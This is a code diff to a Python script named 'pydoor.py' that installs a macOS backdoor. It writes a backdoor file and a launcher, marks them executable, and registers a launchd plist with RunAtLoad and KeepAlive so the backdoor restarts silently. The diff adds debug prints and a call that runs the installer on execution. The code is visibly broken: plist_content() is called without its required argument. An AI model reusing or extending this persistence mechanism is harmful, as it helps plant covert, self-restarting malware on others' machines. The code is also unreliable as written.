@@ -6,6 +6,7 @@ import stat
 
 SCRIPT_NAME = "pydoor.py"
 PLIST_NAME  = "com.startup.plist"
+VERBOSE     = True
 
 path_to_python = sys.executable
 saved_place = os.getcwd()
@@ -20,6 +21,8 @@ def generate_launcher(path, path_to_backd):
     with open(path, 'w') as f:
         f.write(content)
 
+    if VERBOSE: print("Wrote launcher:", path)
+
     st = os.stat(path)
     os.chmod(path, st.st_mode | stat.S_IEXEC)
 
@@ -29,12 +32,14 @@ def save_backdoor(path):
     with open(path, 'w') as f:
         f.write(content)
 
+    if VERBOSE: print("Wrote backdoor:", path)
+
     return path
 
 # MAC OSX 
 
 def plist_content(backd_path):
-    return f"""
+    return """
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -44,15 +49,15 @@ def plist_content(backd_path):
     <key>EnvironmentVariables</key>
     <dict>
         <key>PATH</key>
-        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:{path_to_python}:</string> </dict>
+        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:{}:</string> </dict>
     <key>KeepAlive</key>
     <true/>
     <key>Label</key>
     <string>com.pydoor</string>
     <key>ProgramArguments</key>
     <array>
-        <string>{path_to_python}</string>
-        <string>{backd_path}</string>
+        <string>{}</string>
+        <string>{}</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -62,7 +67,7 @@ def plist_content(backd_path):
     <string>/dev/null</string>
 </dict>
 </plist>
-"""
+""".format(path_to_python, path_to_python,backd_path)
 
 def generate_plist(method='daemon'):
     if method == 'daemon':
@@ -73,6 +78,8 @@ def generate_plist(method='daemon'):
     plist_fn = os.path.join(path_to_plist, PLIST_NAME)
     with open(plist_fn, 'w') as f:
         f.write(plist_content())
+
+    if VERBOSE: print("Wrote plist:", plist_fn)
 
     return plist_fn
 
@@ -100,3 +107,6 @@ def macosx():
     # Create plist
     plist_path = generate_plist(plist_method)
     activate_plist(plist_path)
+
+
+macosx()
